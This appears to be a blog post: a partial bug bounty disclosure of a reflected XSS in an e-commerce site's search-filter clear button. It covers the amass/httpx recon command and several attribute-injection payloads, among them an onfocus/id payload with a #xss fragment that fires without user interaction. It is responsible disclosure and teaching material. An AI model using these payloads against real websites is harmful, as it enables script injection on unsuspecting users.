          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-1&quot;&gt;3.1.1. Struggling to find a payload&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#section-id-3-1-2&quot;&gt;3.1.2. The winning payload&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#section-id-3-2&quot;&gt;3.2. Why does the payload work?&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-4&quot;&gt;4. Report resolution&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#section-id-5&quot;&gt;5. Lessons learned&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/general/bug-bounty.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;:warning: &lt;span style=&quot;color:red&quot;&gt;This bug was reported in a private program in which it is not allowed to publish the vulnerabilities found. So this is a partial disclosure, only the essential technical details are exposed.&lt;/span&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;In this post I am going to show an interesting XSS that I reported in a bug bounty program: reflected XSS in search filter clear button in an e-commerce website. I will show you all the payloads I tried, some of them quite curious, and how my friend &lt;a href=&quot;https://www.linkedin.com/in/cybersecurityfranciscogilamoros/&quot;&gt;Fran&lt;/a&gt; ended up giving me the winning payload. Sometimes the important thing is not the result but the way.&lt;/p&gt;

&lt;div id=&quot;section-id-1&quot; /&gt;

&lt;h2 id=&quot;1-asset-discovery&quot;&gt;1. Asset discovery&lt;/h2&gt;

&lt;p&gt;I found this asset through amass + httpx. If you are looking for http services on subdomains of the domain example.com and you have your config file in the path &lt;em&gt;/home/user/.config/amass/config.ini&lt;/em&gt;, you can use the following command&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;amass enum -brute -d example.com &apos;/home/user/.config/amass/config.ini&apos; | httpx -title -tech-detect -status-code -ip -p 66,80,81,443,445,457,1080,1100,1241,1352,1433,1434,1521,1944,2301,3000,3128,3306,4000,4001,4002,4100,5000,5432,5800,5801,5802,6082,6346,6347,7001,7002,8080,8443,8888,30821
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/OWASP/Amass&quot;&gt;Amass&lt;/a&gt; is an OSINT tool to perform network mapping of attack surfaces and external asset discovery which is a very famous tool used in the recon step in bug bounty. The output of the above amass command is a list of subdomains of the given domain, i.e, a list of potential targets.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/projectdiscovery/httpx&quot;&gt;Httpx&lt;/a&gt; is a multi-purpose HTTP toolkit allow to run multiple probers. In this case, the input of httpx is a list of subdomains and the output is a list of subdomains that have an http service in any of the ports given as a parameter. Also it shows some additional information about the service such as the title, the detected technologies… that I have specified in the parameters to be displayed.&lt;/p&gt;

&lt;div id=&quot;section-id-2&quot; /&gt;

&lt;h2 id=&quot;2-vulnerability-discovery&quot;&gt;2. Vulnerability discovery&lt;/h2&gt;

&lt;p&gt;I discovered this XSS by chance while waiting for the &lt;em&gt;Burp Scanner&lt;/em&gt; to finish. I sent the payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HackCommander&quot;&apos;&amp;gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;with some “dangerous” characters and I received the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/detection-request.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see the payload broke the a tag. The &amp;lt; character was not reflected but the “’&amp;gt; characters were, because as you can see it breaks the a tag making that the characters “&amp;gt; that formed the end of the tag are no longer part of it and now they are outside, as the arrow points out. This made me think that there could be an XSS.&lt;/p&gt;

&lt;div id=&quot;section-id-3&quot; /&gt;

&lt;h2 id=&quot;3-vulnerability-exploitation&quot;&gt;3. Vulnerability exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1&quot; /&gt;

&lt;h2 id=&quot;31-steps-of-exploitation&quot;&gt;3.1. Steps of exploitation&lt;/h2&gt;

&lt;div id=&quot;section-id-3-1-1&quot; /&gt;

&lt;h3 id=&quot;311-struggling-to-find-a-payload&quot;&gt;3.1.1. Struggling to find a payload&lt;/h3&gt;

&lt;p&gt;As you saw in the above capture, the &amp;lt; character was not reflected so I had to try XSS in the context of the attributes.&lt;/p&gt;

&lt;p&gt;Therefore, the first payload I sent was&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;+onclick=&quot;alert(1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and I got the following response&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-onclick-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The response in the browser looked like this&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-onclick-browser.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and by clicking on the &lt;em&gt;X&lt;/em&gt;, the &lt;em&gt;alert(1)&lt;/em&gt; was executed, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-onclick-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But… what is this &lt;em&gt;X&lt;/em&gt;? It is the tag that we are dealing with in this XSS and its function is to serve as a kind of “button” to remove the filters set when you are looking for a product to buy, since this website was an e-commerce website. It serves to remove a concrete filter that as you can guess is of the type price, manufacturer, rating… and the title attribute of each a tag is something like &lt;em&gt;Remove + “name of the filter”&lt;/em&gt;. The title attribute is the injection point.&lt;/p&gt;

&lt;p&gt;For example, if you were looking for chairs for less than 100 euros with a rating of at least 4 stars, you will have an &lt;em&gt;X&lt;/em&gt; button for each of these filters, which you can delete individually by clicking on the corresponding &lt;em&gt;X&lt;/em&gt;. The title attribute of the a tag used to remove the price would be &lt;em&gt;Remove price&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This XSS requires user interaction, it requires the user to click on that tiny X. So the goal I had was to scale this XSS to one that required no interaction or a more likely interaction.&lt;/p&gt;

&lt;p&gt;So first I tried to make it so that the user didn’t have to click but simply hover the mouse over the &lt;em&gt;X&lt;/em&gt;, that means, I sent the payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;+onmouseover=&quot;alert(1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and it worked as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-onmouseover-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hovering the mouse over the X the &lt;em&gt;alert(1)&lt;/em&gt; was executed. But… the X is very small, the &lt;em&gt;alert(1)&lt;/em&gt; will only be executed if the user accidentally hover the mouse over the &lt;em&gt;X&lt;/em&gt;, which is not very likely.&lt;/p&gt;

&lt;p&gt;The way to make the user more likely to mouse over the &lt;em&gt;X&lt;/em&gt; is to make the X bigger, but… is this possible? YEAH, IT IS. The way to do this is by injecting CSS code through the &lt;em&gt;style&lt;/em&gt; attribute, so I sent the payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;+style=&quot;position:+fixed;width:+2000px;height:2000px;background-color:purple;&quot;+onmouseover=&quot;alert(1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;where the meaning of each property is&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;position: fixed;&lt;/strong&gt;: Sets the positioning of the element to be fixed, meaning it will remain in a fixed position even when the page is scrolled.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;width: 2000px;&lt;/strong&gt;: Sets the width of the element to be 2000 pixels.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;height: 2000px;&lt;/strong&gt;: Sets the height of the element to be 2000 pixels.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;background-color: purple;&lt;/strong&gt;: Sets the background color of the element to purple.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;and it worked as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-style-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now almost the whole screen is purple (the blue areas were placed by me to obfuscate information) as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-style-browser.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and it is enough to put the mouse over the purple area to execute the &lt;em&gt;alert(1)&lt;/em&gt;. This XSS still requires user interaction but this interaction is much more likely, it is almost certain. This is already something reportable.&lt;/p&gt;

&lt;p&gt;However, I wanted to achieve an XSS that did not require user interaction. The only one that I could think of was the typical&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;+autofocus+onfocus=&quot;alert(1)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I sent this payload and it was reflected as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-autofocus-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;but the &lt;em&gt;alert(1)&lt;/em&gt; was not executed. Why? Because the only tags that support the &lt;em&gt;autofocus&lt;/em&gt; attribute are &lt;em&gt;input&lt;/em&gt;, &lt;em&gt;button&lt;/em&gt;, &lt;em&gt;select&lt;/em&gt; and &lt;em&gt;textarea&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;And that’s as far as my creativity went, so I decided to report the XSS with the &lt;em&gt;style&lt;/em&gt; attribute, which was the best payload I could find.&lt;/p&gt;

&lt;div id=&quot;section-id-3-1-2&quot; /&gt;

&lt;h3 id=&quot;312-the-winning-payload&quot;&gt;3.1.2. The winning payload&lt;/h3&gt;

&lt;p&gt;Before reporting I told my friend &lt;a href=&quot;https://www.linkedin.com/in/cybersecurityfranciscogilamoros/&quot;&gt;Fran&lt;/a&gt; about the case and he told me to try this payload&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;+onfocus=&quot;alert(1)&quot;+id=&quot;xss&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;adding the term &lt;em&gt;#xss&lt;/em&gt; at the end of the URL. So if the domain is &lt;em&gt;example.com&lt;/em&gt; and the vulnerable param is &lt;em&gt;vulnerable-param&lt;/em&gt;, the malicious URL would be&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://example.com/?vulnerable-param=&quot;+onfocus=&quot;alert(1)&quot;+id=&quot;xss&quot;&amp;gt;#xss
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When I saw this payload I thought… Damn! Shame on me! How could I not realize it!&lt;/p&gt;

&lt;p&gt;I can’t use the &lt;em&gt;autofocus&lt;/em&gt; attribute but I can name the tag with the attribute assignment &lt;em&gt;id=”xss”&lt;/em&gt; and force the focus on it with the term &lt;em&gt;#xss&lt;/em&gt;. It worked as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-hash-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now the &lt;em&gt;alert(1)&lt;/em&gt; is executed with no user interaction as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2023-06-24-reflected-xss-in-search-filter-clear-button/expoitation-hash-alert.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;:clap: :clap: :clap:&lt;/p&gt;

&lt;p&gt;He then told me that he had read about this payload in the following Portswigger article&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://portswigger.net/research/one-xss-cheatsheet-to-rule-them-all&quot;&gt;One XSS cheatsheet to rule them all (PortSwigger)&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;God bless Portswigger! :pray: :raised_hands:&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work?&lt;/h2&gt;

&lt;p&gt;Given what we have seen, it is easy to understand why the payload works:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;The user clicks on the malicious link and sends the request with the payload&lt;/p&gt;

    &lt;div class=&quot;code-header&quot;&gt;
   &lt;button class=&quot;copy-code-button&quot;&gt;
     Copy
   &lt;/button&gt;
 &lt;/div&gt;
    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &quot;+onfocus=&quot;alert(1)&quot;+id=&quot;xss&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The user’s browser receives and processes the response. Within that response is the label&lt;/p&gt;

    &lt;div class=&quot;code-header&quot;&gt;
   &lt;button class=&quot;copy-code-button&quot;&gt;
     Copy
   &lt;/button&gt;
 &lt;/div&gt;
    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;OBFUSCATED&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://OBFUSCATED.OBFUSCATED&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;title=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;OBFUSCATED&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;onfocus=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;alert(1)&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;id=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xss&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;

    &lt;p&gt;The string &lt;em&gt;OBFUSCATED&lt;/em&gt; does not really appear in the answer, I have put it to obfuscate information about the target.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;The user puts the focus on the tag above due to the term &lt;em&gt;#xss&lt;/em&gt; at the end of the URL and the &lt;em&gt;id=”xss”&lt;/em&gt; attribute assignment of the tag.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Due to the onfocus event of the tag above, the Javascript code &lt;em&gt;alert(1)&lt;/em&gt; is executed.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;The subdomain is an e-commerce asset but, I don’t know why, they considered the asset to be of medium criticity. Also an XSS usually is considered a medium severity vulnerability and because I wasn’t able to sign up and log in the website, I couldn’t demonstrate a high impact such as session hijacking. Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: Medium&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: Medium&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $100&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Bug bounty is a competitive field but whenever you can collaborate with other bug bounty hunters. I think bug bounty is a scientific-technical field and in science collaboration is essential. Sharing the bounty is just a nice consequence of collaboration.&lt;/li&gt;
  &lt;li&gt;The way is usually more important than the result. In this case you saw how I was struggling until I found the winning payload and along the way I found beautiful jewels. In this case they were not necessary but in the future maybe I will find cases where the winning payload is not possible and I can use some of these payloads that I found.&lt;/li&gt;
  &lt;li&gt;The solution is sometimes obvious. See how I’ve been racking my brain trying to find a payload, and in the end, this one was much simpler than all the ones I had thought of. Always try to apply &lt;a href=&quot;https://en.wikipedia.org/wiki/Occam%27s_razor&quot;&gt;Occam’s razor&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="osint" /><category term="amass" /><category term="httpx" /><category term="burpsuite" /><category term="portswigger" /><category term="xss" /><summary type="html">Partial disclosure of a bug bounty report: reflected XSS in search filter clear button in an e-commerce website.</summary></entry></feed>